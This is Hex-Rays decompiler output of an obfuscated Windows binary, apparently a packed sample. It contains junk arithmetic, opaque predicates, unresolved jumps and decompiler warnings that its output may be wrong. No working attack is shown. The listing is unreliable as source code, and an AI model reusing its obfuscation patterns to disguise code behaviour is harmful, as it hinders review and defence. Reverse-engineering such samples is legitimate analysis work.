/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// int __usercall sub_401044@<eax>(int a1@<eax>, int a2@<ebp>);
int sub_401106();
// int __usercall sub_4016E5@<eax>(int a1@<eax>);
void sub_40181B();
// int __usercall sub_401BBB@<eax>(int a1@<eax>);
// void __usercall sub_402089(int *a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>, __int128 a4);
// int __usercall sub_402162@<eax>(int a1@<eax>);
void sub_40266F();
// void __usercall sub_40280A(int a1@<eax>);
// int __usercall sub_402846@<eax>(int a1@<eax>);
// int __usercall sub_4028C9@<eax>(int a1@<eax>);
// int __usercall sub_4028DC@<eax>(int a1@<eax>);
_DWORD start(); // weak
// int __usercall sub_402C07@<eax>(int a1@<eax>);
// int __usercall sub_402DD2@<eax>(int a1@<eax>);
void sub_402FEE();
// int __usercall sub_403209@<eax>(int a1@<eax>);
// int __usercall sub_4033BE@<eax>(int a1@<eax>);
// int __usercall sub_403422@<eax>(int a1@<eax>, int a2@<ebp>);
// int __usercall sub_40392F@<eax>(int a1@<eax>);
// int __usercall sub_403984@<eax>(int a1@<eax>);
// int __usercall sub_404175@<eax>(int a1@<eax>);
// int __usercall sub_404285@<eax>(int a1@<eax>);
int sub_404293();
// void __usercall sub_404BA5(int a1@<eax>, __int128 a2);
// int __usercall sub_405174@<eax>(int a1@<eax>);
// int __usercall sub_405CC3@<eax>(int a1@<eax>);
// int __usercall sub_4061DC@<eax>(int a1@<eax>);
int sub_40624C();
int sub_4063E4();
// int __usercall sub_406B4C@<eax>(int a1@<eax>);
// int __usercall sub_406BFF@<eax>(int a1@<eax>);
int __cdecl sub_40787A(int a1, int a2, unsigned __int8 *a3);
// void __usercall sub_407CDD(int a1@<eax>);
_BYTE *__cdecl sub_408153(_BYTE *a1, _BYTE *a2);
unsigned int __cdecl sub_408322(_BYTE *a1);
// void __usercall sub_408536(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>);
unsigned __int8 __cdecl sub_408601(_BYTE *a1, unsigned int a2, int a3);
// int __usercall sub_408841@<eax>(int a1@<eax>, int a2@<edi>);
int __stdcall sub_40892D(int a1, unsigned __int8 *a2, unsigned int *a3);
// int __usercall sub_408A23@<eax>(int a1@<eax>, int a2);
// char __usercall sub_408FD4@<al>(int a1@<ebx>);
void __noreturn sub_40A23C(); // weak
void sub_40AD93();
// void __usercall sub_40E99D(char a1@<al>, int a2@<edx>, __int16 a3@<cx>, _BYTE *a4@<ebx>, _BYTE *a5@<edi>, _BYTE *a6@<esi>);
// int __userpurge sub_40EB0F@<eax>(int a1@<eax>, char a2@<dl>, int a3@<ecx>, int _EBP@<ebp>, __int32 a5@<edi>, int a6@<esi>, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24, int a25, int a26, int a27, int a28, int a29, int a30, int a31, int a32, int a33, int a34, int a35, int a36, int a37, int a38, int a39, int a40, int a41, int a42, int a43, int a44, int a45, int a46, int a47, int a48, int a49, int a50, int a51, int a52, int a53, int a54, int a55, int a56, int a57, int a58, int a59, int a60, int a61, int a62, int a63);
_DWORD sub_41035B(); // weak
// void __usercall sub_43EA2A(char a1@<cf>, _BYTE *a2@<eax>, int a3@<ebx>);
// void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// UINT __stdcall GetACP();
// LPSTR __stdcall GetCommandLineA();
// DWORD __stdcall GetCurrentProcessId();
// DWORD __stdcall GetCurrentThreadId();
// DWORD __stdcall GetFileType(HANDLE hFile);
// DWORD __stdcall GetFullPathNameA(LPCSTR lpFileName, DWORD nBufferLength, LPSTR lpBuffer, LPSTR *lpFilePart);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// UINT __stdcall GetOEMCP();
// BOOL __stdcall HeapDestroy(HANDLE hHeap);
// HMODULE __stdcall LoadLibraryExA(LPCSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);
// BOOL __stdcall MoveFileExA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, DWORD dwFlags);
// BOOL __stdcall QueryPerformanceCounter(LARGE_INTEGER *lpPerformanceCount);
// BOOL __stdcall SetPriorityClass(HANDLE hProcess, DWORD dwPriorityClass);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_40734A; // weak
_UNKNOWN unk_420E76; // weak
_UNKNOWN unk_420F76; // weak
int dword_43E004 = 0; // weak
int dword_43E008 = 0; // weak
int dword_43E00C = 0; // weak
int dword_43E010 = 0; // weak
int dword_43E014 = 0; // weak
int dword_43E018 = 0; // weak
int dword_43E01C = 0; // weak
int dword_43E020 = 0; // weak
int dword_43E024 = 0; // weak
int dword_43E028 = 0; // weak
int dword_43E02C = 0; // weak
int dword_43E030 = 0; // weak
int dword_43E034 = 0; // weak
int dword_43E038 = 0; // weak
int dword_43E03C = 0; // weak
int dword_43E040 = 0; // weak
int dword_43E044 = 0; // weak
int dword_43E048 = 0; // weak
int dword_43E04C = 0; // weak
int dword_43E090 = 0; // weak
char byte_43E0C4 = '\0'; // weak
char byte_43E194 = 'C'; // weak
void *off_43E220 = &unk_43FB3C; // weak
int dword_43E348 = -261; // weak
char byte_43E3BC = 'Å'; // weak
void **off_43E448 = &off_43E220; // weak
int dword_43E588 = 355139584; // weak
void *off_43E5D4 = &unk_43F603; // weak
int dword_43E7C8 = -535282431; // weak
int dword_43EF48 = -1642755328; // weak
int dword_43F0C8 = -16759814; // weak
char byte_43F224 = '\x0F'; // weak
int dword_43F258 = 1258291303; // weak
int dword_43F26C = -1138; // weak
int dword_43F408 = -3765; // weak
int dword_43F470 = 1306527231; // weak
int dword_43F59A = 88675123; // weak
int dword_43F5A2 = 0; // weak
int dword_43F5CE = 0; // weak
int dword_43F5E1 = 0; // weak
int dword_43F60F = 0; // weak
int dword_43F617 = 217280; // weak
int dword_43F623 = 362436069; // weak
int dword_43F62F = 0; // weak
int dword_43F643 = 0; // weak
int dword_43F64B = 0; // weak
int dword_43F663 = 521288629; // weak
int dword_43F667 = 0; // weak
int dword_43F673 = 0; // weak
int dword_43F683 = 0; // weak
_UNKNOWN unk_43F69B; // weak
char byte_43F69C = '\0'; // weak
char byte_43F6A4 = '\0'; // weak
int dword_43F79A = 0; // weak
int dword_43F7B2 = 0; // weak
int dword_43F7BE = 0; // weak


//----- (00401044) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_401044@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int v2; // eax
  int v3; // et2

  *(_DWORD *)(a2 - 4) = 247;
  *(_DWORD *)(a2 - 32) = 51;
  *(_DWORD *)(a2 - 44) = 137;
  *(_DWORD *)(a2 - 28) = 137;
  *(_DWORD *)(a2 - 12) = 122;
  *(_DWORD *)(a2 - 24) = 198;
  *(_DWORD *)(a2 - 40) = 48;
  *(_DWORD *)(a2 - 20) = 11;
  *(_DWORD *)(a2 - 16) = 41;
  v3 = a1 % 98;
  v2 = a1 / 98;
  *(_DWORD *)(a2 - 8) = v3;
  if ( v3 >= 32 )
    return 108;
  sub_4033BE(v2);
  return 255;
}
// 404756: positive sp value 4 has been found

//----- (00401106) --------------------------------------------------------
int sub_401106()
{
  int v0; // ecx
  int result; // eax

  dword_43F667 = sub_4063E4();
  if ( (unsigned int)dword_43F667 < 0xB6D7174E )
  {
    dword_43E024 -= v0;
    result = sub_40624C();
  }
  else
  {
    result = sub_404293();
  }
  dword_43E00C += 14189;
  LOBYTE(dword_43E00C) = -61;
  return result;
}
// 406B83: variable 'v0' is possibly undefined
// 43E00C: using guessed type int dword_43E00C;
// 43E024: using guessed type int dword_43E024;
// 43F667: using guessed type int dword_43F667;

//----- (004016E5) --------------------------------------------------------
int __usercall sub_4016E5@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 21 < 17 )
    result = 980;
  else
    result = 61;
  return result;
}

//----- (0040181B) --------------------------------------------------------
void sub_40181B()
{
  JUMPOUT(0x4024C2);
}
// 4027CA: control flows out of bounds to 4024C2

//----- (00401BBB) --------------------------------------------------------
int __usercall sub_401BBB@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 83 < 29 )
    result = 6;
  else
    result = 198;
  return result;
}
// 401462: conditional instruction was optimized away because of '%var_4.4==10'
// 402A77: conditional instruction was optimized away because of '%var_2C.4==39'
// 403C9A: conditional instruction was optimized away because of '%var_2C.4==39'
// 406E73: conditional instruction was optimized away because of '%var_8.4==4E'
// 406E7F: conditional instruction was optimized away because of '%var_28.4==4E'
// 406E85: conditional instruction was optimized away because of '%var_28.4==4E'

//----- (00402089) --------------------------------------------------------
// local variable allocation has failed, the output may be wrong!
void __usercall sub_402089(int *a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>, __int128 a4)
{
  unsigned int v4; // ecx
  int v5; // edx
  int v6; // edx
  BOOL v7; // eax
  unsigned int v8; // ecx
  int v9; // ecx
  unsigned int v10; // edx
  char *v11; // ecx
  int v12; // eax
  int v13; // ecx
  int *v14; // ecx
  int v15; // ecx
  __int16 v16; // cx
  char *v17; // ecx
  unsigned int v18; // eax
  int v19; // ecx
  int v20; // [esp+39h] [ebp-3A7h]
  int v21; // [esp+E4h] [ebp-2FCh]
  int v22; // [esp+ECh] [ebp-2F4h]
  int v23; // [esp+118h] [ebp-2C8h]
  int v24; // [esp+160h] [ebp-280h] BYREF
  __int16 v25; // [esp+168h] [ebp-278h]
  _DWORD v26[2]; // [esp+16Ch] [ebp-274h]
  int v27; // [esp+174h] [ebp-26Ch]
  int v28; // [esp+1A4h] [ebp-23Ch]
  int v29; // [esp+1C4h] [ebp-21Ch]
  int v30; // [esp+1D4h] [ebp-20Ch]
  int v31; // [esp+1DCh] [ebp-204h]
  char v32; // [esp+1F8h] [ebp-1E8h]
  int v33; // [esp+21Ch] [ebp-1C4h]
  char v34; // [esp+228h] [ebp-1B8h] BYREF
  _DWORD v35[12]; // [esp+24Ch] [ebp-194h] BYREF
  int v36; // [esp+298h] [ebp-148h]
  int v37; // [esp+2CCh] [ebp-114h]
  __int16 v38; // [esp+2E0h] [ebp-100h]
  int v39; // [esp+2ECh] [ebp-F4h]
  LARGE_INTEGER PerformanceCount; // [esp+304h] [ebp-DCh] BYREF
  int v41; // [esp+318h] [ebp-C8h]
  char v42; // [esp+334h] [ebp-ACh]
  char v43; // [esp+360h] [ebp-80h]
  int v44; // [esp+384h] [ebp-5Ch]
  int v45; // [esp+3ACh] [ebp-34h]
  char v46; // [esp+3CCh] [ebp-14h]
  char v47; // [esp+3D0h] [ebp-10h]
  int savedregs; // [esp+3E0h] [ebp+0h] BYREF
  void *retaddr; // [esp+3E4h] [ebp+4h] OVERLAPPED

  v38 ^= 0x43u;
  if ( a1 != (int *)960 )
  {
    a1 = &savedregs;
    a3 |= *(unsigned int *)((char *)&retaddr + 3);
    a2 ^= *(_DWORD *)((char *)&a4 + 5);
    v42 ^= 0x1Eu;
  }
  v16 = a3 - 11294 + (a3 < 0x2C1E) + a3 - 11294;
  if ( (int *)a2 == a1 )
  {
    LOBYTE(v44) = v44 + 39;
    v15 = (((_WORD)v29 + v16) & 0x2202) - (_DWORD)retaddr;
    if ( v15 )
    {
LABEL_19:
      v26[0] ^= v15;
      v7 = QueryPerformanceCounter(&PerformanceCount);
      v6 = v45 + v5;
      v44 |= v7;
      v12 = v41 | v7;
      v14 = (int *)(v23 | v13);
      if ( v6 )
      {
        v14 = &v24;
        v6 += *(_DWORD *)((char *)v26 + 2);
        v47 |= 0x86u;
        v12 = (unsigned __int16)v28 & (unsigned __int16)(v25 ^ v12) & 0x2695;
      }
      v11 = (char *)v14 - 11215;
      v17 = v11 + 3641;
      v43 |= 0x39u;
      if ( v24 != v6 )
      {
        v31 ^= 0x20u;
        v17 += v12;
      }
      if ( !v12 )
      {
        v9 = *(_DWORD *)((char *)&a4 + 3) + (*(_DWORD *)((char *)&a4 + 5) | (unsigned int)v17);
        if ( &savedregs != (int *)v9 )
        {
          v19 = (*(_DWORD *)((_BYTE *)&a4 + 2) & v9) - *(_DWORD *)((char *)&retaddr + 2);
          v8 = v19 - (_DWORD)&savedregs;
          if ( v8 != 90 )
          {
            v10 = *(_DWORD *)((char *)&a4 + 1) ^ (v20
                                                + ((*(_DWORD *)((char *)&a4 + 6) | (unsigned int)&savedregs | 0x24BB) < v8)
                                                + (*(_DWORD *)((char *)&a4 + 6) | (unsigned int)&savedregs | 0x24BB));
            v18 = v10 & (*(_DWORD *)((char *)&a4 + 6) ^ (unsigned int)&savedregs);
            v44 ^= v18;
            if ( v18 == 621 )
              JUMPOUT(0x402C41);
            if ( (v30 | v22 | (v10 + 15172)) != v18 )
            {
              v46 |= 0xD3u;
              if ( !v18 )
              {
                v39 &= 0x3Cu;
                JUMPOUT(0x40388A);
              }
              LOWORD(v31) = v31 & 0xCE;
            }
          }
        }
      }
      JUMPOUT(0x402493);
    }
    v32 += 39;
    v4 = -v21;
    v37 -= v21;
    if ( -v21 != 624 )
    {
LABEL_21:
      v15 = v35[0] + v4;
      v36 += (int)v35;
      v33 -= 255;
      goto LABEL_19;
    }
    v27 += 624;
    v33 -= 624;
  }
  v29 -= 40;
  v4 = *(_DWORD *)((char *)&a4 + 3) ^ (unsigned int)&v34;
  goto LABEL_21;
}
// 40173C: control flows out of bounds to 402493
// 4018D2: control flows out of bounds to 40388A
// 4059C7: control flows out of bounds to 402C41
// 402089: variables would overlap: ^3E8.4(retaddr) and ^3EA.4,^3EB.4

//----- (00402162) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_402162@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2
  int v4; // eax

  v2 = a1 % 66;
  v1 = a1 / 66;
  if ( v2 >= 25 )
    return 77;
  v4 = sub_402846(v1);
  sub_4028C9(v4);
  return 708;
}
// 404F86: positive sp value C has been found
// 402A01: conditional instruction was optimized away because of '%0x44.4==9A'

//----- (0040266F) --------------------------------------------------------
void sub_40266F()
{
  JUMPOUT(0x4022CE);
}
// 402678: control flows out of bounds to 4022CE

//----- (0040280A) --------------------------------------------------------
void __usercall sub_40280A(int a1@<eax>)
{
  if ( a1 % 72 >= 21 )
    JUMPOUT(0x404687);
  JUMPOUT(0x4024B8);
}
// 403694: control flows out of bounds to 404687
// 40619A: control flows out of bounds to 4024B8
// 404EE0: conditional instruction was optimized away because of '%0x14.4==19'

//----- (00402846) --------------------------------------------------------
int __usercall sub_402846@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  return sub_403422(a1, (int)&savedregs);
}

//----- (004028C9) --------------------------------------------------------
int __usercall sub_4028C9@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  return sub_401044(a1, (int)&savedregs);
}

//----- (004028DC) --------------------------------------------------------
int __usercall sub_4028DC@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 113 < 24 )
    result = 347;
  else
    result = 28;
  return result;
}
// 405503: conditional instruction was optimized away because of '%var_20.4==7B'
// 40550F: conditional instruction was optimized away because of '%var_18.4==A1'

//----- (00402AB1) --------------------------------------------------------
#error "405966: call analysis failed (funcsize=86)"

//----- (00402C07) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_402C07@<eax>(int a1@<eax>)
{
  if ( a1 % 25 < 17 )
    JUMPOUT(0x404CAF);
  return 72;
}
// 406052: positive sp value 6C has been found
// 4046E1: control flows out of bounds to 4024D9
// 4069BB: control flows out of bounds to 404CAF
// 4010E2: conditional instruction was optimized away because of '%var_54.4==19'

//----- (00402DD2) --------------------------------------------------------
int __usercall sub_402DD2@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 66 < 17 )
    result = 148;
  else
    result = 132;
  return result;
}

//----- (00402FEE) --------------------------------------------------------
void sub_402FEE()
{
  JUMPOUT(0x40224D);
}
// 402FF4: control flows out of bounds to 40224D

//----- (00403209) --------------------------------------------------------
int __usercall sub_403209@<eax>(int a1@<eax>)
{
  if ( a1 % 193 >= 33 )
    return 138;
  sub_40266F();
  return 570;
}
// 402DC2: conditional instruction was optimized away because of 'edi.4==D4'

//----- (004033BE) --------------------------------------------------------
int __usercall sub_4033BE@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2

  v2 = a1 % 238;
  v1 = a1 / 238;
  if ( v2 >= 13 )
    return 111;
  sub_402DD2(v1);
  return 321;
}
// 403518: conditional instruction was optimized away because of '%0x28.4==CE'
// 403A30: conditional instruction was optimized away because of '%0x20.4==AE'
// 403A41: conditional instruction was optimized away because of 'edi.4==EE'
// 403A48: conditional instruction was optimized away because of 'edi.4==EE'

//----- (00403422) --------------------------------------------------------
int __usercall sub_403422@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int result; // eax

  *(_DWORD *)(a2 - 4) = 9;
  *(_DWORD *)(a2 - 16) = 240;
  *(_DWORD *)(a2 - 20) = 108;
  *(_DWORD *)(a2 - 8) = 129;
  *(_DWORD *)(a2 - 12) = 181;
  *(_DWORD *)(a2 - 32) = a1 % 9;
  if ( a1 % 9 < 20 )
    result = 639;
  else
    result = 194;
  return result;
}

//----- (0040392F) --------------------------------------------------------
int __usercall sub_40392F@<eax>(int a1@<eax>)
{
  int v2; // eax
  int v3; // et2

  v3 = a1 % 141;
  v2 = a1 / 141;
  if ( v3 >= 22 )
    return 159;
  sub_402162(v2);
  return 790;
}
// 401C2B: conditional instruction was optimized away because of '%var_10.4==6F'
// 401C31: conditional instruction was optimized away because of '%var_10.4==6F'
// 401C38: conditional instruction was optimized away because of '%var_10.4==6F'
// 406966: conditional instruction was optimized away because of '%var_10.4==6F'

//----- (00403984) --------------------------------------------------------
int __usercall sub_403984@<eax>(int a1@<eax>)
{
  if ( a1 % 5 < 29 )
    JUMPOUT(0x402184);
  return 0;
}
// 406B1D: control flows out of bounds to 402184

//----- (00404175) --------------------------------------------------------
int __usercall sub_404175@<eax>(int a1@<eax>)
{
  int v1; // eax

  if ( a1 % 82 >= 37 )
    return 22;
  v1 = sub_402846(0);
  sub_405174(v1);
  return 246;
}
// 403E35: conditional instruction was optimized away because of '%var_C.4==AF'

//----- (00404285) --------------------------------------------------------
int __usercall sub_404285@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 102 < 37 )
    result = 184;
  else
    result = 14;
  return result;
}
// 40648F: conditional instruction was optimized away because of '%var_10.4==2'
// 406495: conditional instruction was optimized away because of '%var_10.4==2'

//----- (00404293) --------------------------------------------------------
int sub_404293()
{
  int result; // eax
  unsigned int v1; // eax

  v1 = dword_43F617 ^ (dword_43F617 << 11);
  dword_43E014 = dword_43F258;
  LOBYTE(dword_43E034) = 96;
  dword_43F617 = dword_43F623;
  dword_43E040 = 11001;
  dword_43F623 = dword_43F663;
  dword_43F663 = dword_43F59A;
  dword_43E024 = 32061;
  dword_43F59A ^= (v1 >> 8) ^ v1 ^ ((unsigned int)dword_43F59A >> 19);
  LOBYTE(dword_43E030) = dword_43E030 - 19;
  LOBYTE(dword_43E044) = dword_43E044 - 97;
  result = dword_43F59A;
  dword_43E00C = (int)off_43E5D4 + 20851;
  return result;
}
// 43E00C: using guessed type int dword_43E00C;
// 43E014: using guessed type int dword_43E014;
// 43E024: using guessed type int dword_43E024;
// 43E030: using guessed type int dword_43E030;
// 43E034: using guessed type int dword_43E034;
// 43E040: using guessed type int dword_43E040;
// 43E044: using guessed type int dword_43E044;
// 43E5D4: using guessed type void *off_43E5D4;
// 43F258: using guessed type int dword_43F258;
// 43F59A: using guessed type int dword_43F59A;
// 43F617: using guessed type int dword_43F617;
// 43F623: using guessed type int dword_43F623;
// 43F663: using guessed type int dword_43F663;

//----- (00404BA5) --------------------------------------------------------
void __usercall sub_404BA5(int a1@<eax>, __int128 a2)
{
  unsigned int v2; // edx
  int v3; // ecx
  int v4; // eax
  unsigned int v5; // eax
  int v6; // edx
  unsigned int v7; // ecx
  int v8; // ecx
  bool v9; // cf
  int v10; // edx
  int v11; // ecx
  unsigned int v12; // eax
  unsigned int v13; // edx
  int v14; // eax
  int v15; // edx
  unsigned int v16; // ecx
  int v17; // ecx
  char *v18; // ecx
  int v19; // edx
  int v20; // kr00_4
  int v21; // eax
  unsigned int v22; // edx
  int v23; // ecx
  char *v24; // ecx
  unsigned int v25; // eax
  unsigned int v26; // ecx
  unsigned int v27; // eax
  int v28; // edx
  unsigned int v29; // ecx
  int v30; // edx
  unsigned int v31; // ecx
  int v32; // edx
  int v33; // eax
  int v34; // ecx
  char v35; // [esp+Ch] [ebp-31Ch] BYREF
  _BYTE v36[5]; // [esp+Dh] [ebp-31Bh]
  int v37; // [esp+14h] [ebp-314h]
  char v38; // [esp+1Ch] [ebp-30Ch]
  int v39; // [esp+30h] [ebp-2F8h]
  int v40; // [esp+44h] [ebp-2E4h]
  char v41; // [esp+4Ch] [ebp-2DCh]
  char *v42; // [esp+54h] [ebp-2D4h]
  char v43[8]; // [esp+60h] [ebp-2C8h] BYREF
  int v44; // [esp+68h] [ebp-2C0h]
  _DWORD v45[5]; // [esp+6Ch] [ebp-2BCh]
  int v46; // [esp+80h] [ebp-2A8h]
  __int16 v47; // [esp+98h] [ebp-290h]
  char v48[2]; // [esp+A0h] [ebp-288h] BYREF
  _BYTE v49[6]; // [esp+A2h] [ebp-286h]
  int v50; // [esp+AFh] [ebp-279h]
  int v51; // [esp+B4h] [ebp-274h]
  char v52; // [esp+BCh] [ebp-26Ch]
  char v53[11]; // [esp+C0h] [ebp-268h] BYREF
  int v54; // [esp+CBh] [ebp-25Dh]
  int v55; // [esp+D0h] [ebp-258h]
  int v56; // [esp+DCh] [ebp-24Ch]
  int v57; // [esp+E0h] [ebp-248h]
  __int16 v58; // [esp+E4h] [ebp-244h]
  __int16 v59; // [esp+ECh] [ebp-23Ch]
  char v60; // [esp+F8h] [ebp-230h] BYREF
  int v61; // [esp+FCh] [ebp-22Ch]
  int v62; // [esp+104h] [ebp-224h]
  char v63; // [esp+10Ch] [ebp-21Ch] BYREF
  int v64; // [esp+110h] [ebp-218h]
  __int16 v65; // [esp+114h] [ebp-214h]
  int v66; // [esp+116h] [ebp-212h]
  char v67[4]; // [esp+120h] [ebp-208h] BYREF
  int v68; // [esp+124h] [ebp-204h]
  char v69; // [esp+128h] [ebp-200h]
  char v70; // [esp+134h] [ebp-1F4h]
  int v71; // [esp+138h] [ebp-1F0h]
  int v72; // [esp+148h] [ebp-1E0h]
  int v73; // [esp+150h] [ebp-1D8h]
  __int16 v74; // [esp+158h] [ebp-1D0h] BYREF
  _DWORD v75[3]; // [esp+164h] [ebp-1C4h]
  int v76; // [esp+170h] [ebp-1B8h]
  int v77; // [esp+180h] [ebp-1A8h]
  int v78; // [esp+194h] [ebp-194h]
  __int16 v79; // [esp+198h] [ebp-190h]
  int v80; // [esp+1A8h] [ebp-180h]
  int v81; // [esp+1BCh] [ebp-16Ch]
  int v82; // [esp+1FCh] [ebp-12Ch]
  __int16 v83; // [esp+204h] [ebp-124h]
  _DWORD v84[4]; // [esp+210h] [ebp-118h]
  int v85[2]; // [esp+220h] [ebp-108h] BYREF
  LARGE_INTEGER PerformanceCount; // [esp+228h] [ebp-100h] BYREF
  _BYTE v87[7]; // [esp+268h] [ebp-C0h] BYREF
  __int16 v88; // [esp+270h] [ebp-B8h]
  int v89; // [esp+274h] [ebp-B4h]
  int v90; // [esp+27Ah] [ebp-AEh]
  int v91; // [esp+290h] [ebp-98h]
  char v92; // [esp+2A8h] [ebp-80h] BYREF
  int v93; // [esp+2B0h] [ebp-78h]
  int v94; // [esp+2B8h] [ebp-70h]
  __int16 v95; // [esp+2BCh] [ebp-6Ch]
  int v96; // [esp+2CCh] [ebp-5Ch]
  int v97; // [esp+2D0h] [ebp-58h]
  int v98; // [esp+2D4h] [ebp-54h]
  int v99; // [esp+2D8h] [ebp-50h]
  int v100; // [esp+2DCh] [ebp-4Ch]
  int v101; // [esp+2F4h] [ebp-34h]
  _DWORD *v102; // [esp+2F8h] [ebp-30h]
  int v103; // [esp+30Ch] [ebp-1Ch]
  int savedregs; // [esp+328h] [ebp+0h] BYREF
  unsigned int retaddr; // [esp+32Ch] [ebp+4h]

  v21 = *(_DWORD *)((char *)v84 + 1) & a1;
  v22 = (unsigned int)&savedregs - 1755;
  if ( !v21 )
    v22 &= v93;
  v85[0] |= v22;
  *(_DWORD *)v87 &= v21;
  v4 = v21 | 0x122A;
  if ( v4 != v80 )
  {
    v5 = v22 + (v4 & 0x23E3);
    v6 = v61 ^ v22;
    v7 = (unsigned int)v43;
    v19 = *(_DWORD *)((char *)v45 + 2) + v6 - v45[0];
    if ( v19 != v5 )
    {
      v62 &= 0xC8u;
      v88 += 222;
      v39 ^= v5;
      if ( v98 != v19 )
        goto LABEL_47;
      if ( v19 == 686 )
      {
LABEL_3:
        v2 = v7 + (v84[0] & v19);
LABEL_6:
        v59 &= 0xC1u;
        v8 = v89 | (*(_DWORD *)&v87[3] + ((__PAIR64__(v7, v5) - __PAIR64__(v2, 11892)) >> 32));
        v9 = __CFADD__(v8, 10886);
        v8 += 10886;
        v10 = (v90 | *(_DWORD *)&v87[2] | v2 | 0x3179) - (v9 + v8);
        v11 = (v99 ^ v8) + 745;
        v12 = v84[0] ^ (unsigned int)&v87[4];
        v13 = (v84[0] ^ (unsigned int)&v87[4]) + v10;
        if ( v11 != v13 )
          goto LABEL_15;
        v44 &= v12;
        v14 = v12 - v13;
        v26 = v11 - v13;
        if ( v14 != 850 )
        {
          LOWORD(v73) = v73 & 0xC6;
          v15 = (int)v48;
          v18 = (char *)(*(_DWORD *)v49 + v26);
          v24 = &v18[v50];
          if ( v48 != v42 )
          {
            v75[0] ^= 0x49u;
            v25 = (unsigned int)v24 | (unsigned int)&v48[(v48 < v42) + v14];
            v52 |= 0xC7u;
            v29 = (unsigned int)&v24[v25];
            if ( v25 == PerformanceCount.LowPart )
              goto LABEL_39;
            v78 += v29;
            v97 ^= v29;
            v74 ^= 0xFAu;
            v55 -= v25;
            v14 = v44 | v72 & *(_DWORD *)&v49[2] & v25;
            if ( v29 == v73 )
              goto LABEL_46;
            v3 = v29 | 0x6B;
            v64 ^= v3;
            v99 -= 91;
            v56 &= v14;
            LOBYTE(v40) = v40 ^ 0x12;
            v15 = ((unsigned int)v48 & 0xCDC) + 3292;
            v16 = v3 & 0x335E;
            if ( !v14 )
              goto LABEL_40;
            v34 = v81 ^ v16 & 0x2634;
            v20 = v34 + v15;
            v17 = v34 + v15 + (((unsigned int)v34 + __PAIR64__(v34, v15)) >> 32);
            if ( v20 != PerformanceCount.HighPart )
            {
LABEL_8:
              v14 = *(_DWORD *)((_BYTE *)&a2 + 7) & (v14 ^ 0xEF0);
              v15 = (int)&savedregs - v17;
LABEL_46:
              v14 |= v66;
              v58 += 192;
              v16 = v37 & ((unsigned int)&v63 | 0x12C0);
LABEL_40:
              v32 = v15 ^ 0x3384;
              v33 = v32 & v14;
              v47 |= 0xC4u;
              v13 = v32 - 7856;
              v76 ^= v33;
              v100 &= v16;
LABEL_15:
              v41 &= 0x81u;
              v15 = v94 | v13;
              v29 = (unsigned int)&v67[v57] ^ 0x3D0E;
LABEL_39:
              LOWORD(v77) = v77 + 14;
              v30 = v15 - 8563;
              *(_WORD *)&v36[3] -= 185;
              v31 = v30 + (v29 | 0x804);
              v27 = v30 | (unsigned int)&v92;
              LOBYTE(v98) = v98 | 0xB0;
              v62 &= v30;
              v28 = v30 + 2443;
              if ( v27 - v31 == 0xAFD )
              {
                BYTE2(v90) ^= 0xA9u;
                v97 ^= v28;
              }
              QueryPerformanceCounter(&PerformanceCount);
              if ( v23 == v84[2] )
              {
                v56 |= 0x99u;
                if ( &savedregs == (int *)273 )
                {
                  if ( (int *)((char *)&savedregs - v85[1]) != v102 )
                    goto LABEL_43;
                  v84[0] -= v85;
                  v71 |= 0xB8u;
                }
                v38 |= 0x78u;
              }
LABEL_43:
              v83 += 188;
              LOWORD(v80) = v80 ^ 0xD0;
              v82 ^= 0x7Au;
              JUMPOUT(0x402435);
            }
            v51 &= 0x15u;
            if ( &savedregs == (int *)708 )
              v101 ^= 0x33u;
            v101 |= 0x55u;
            v96 += (int)&savedregs;
            v56 &= (unsigned int)&savedregs;
          }
          v68 &= 0xEDu;
          v14 = (int)&v35;
          v26 = (unsigned int)&savedregs + *(_DWORD *)v36 - v37;
        }
        v65 ^= 4u;
        v17 = v91 & v26;
        goto LABEL_8;
      }
      v95 &= 0xDFu;
      *(_DWORD *)v87 &= (unsigned int)v43;
      v2 = v19 - v103;
      v5 = (unsigned int)&v60;
      if ( !&v60 )
        goto LABEL_6;
      v69 -= 26;
      v80 |= 0xDFu;
      LOBYTE(v55) = v55 & 0x5A;
      v5 = (unsigned int)&v60 | 0x247F;
    }
    v79 ^= 0xDAu;
    v46 -= v5;
    v22 = (unsigned int)&savedregs;
    v4 = ((*(_DWORD *)((_BYTE *)&a2 + 3) & (retaddr | v5 | (unsigned int)v43)) - a2) & (DWORD2(a2) | v5);
  }
  v7 = (unsigned int)v53;
  v19 = v22 - v4;
  v70 += 71;
LABEL_47:
  v89 += v7;
  v19 ^= v54;
  v5 = (unsigned int)&v74;
  v7 = v19 & (unsigned int)&v53[-*(_DWORD *)((char *)v75 + 2)];
  goto LABEL_3;
}
// 406988: control flows out of bounds to 402435
// 404F17: variable 'v23' is possibly undefined

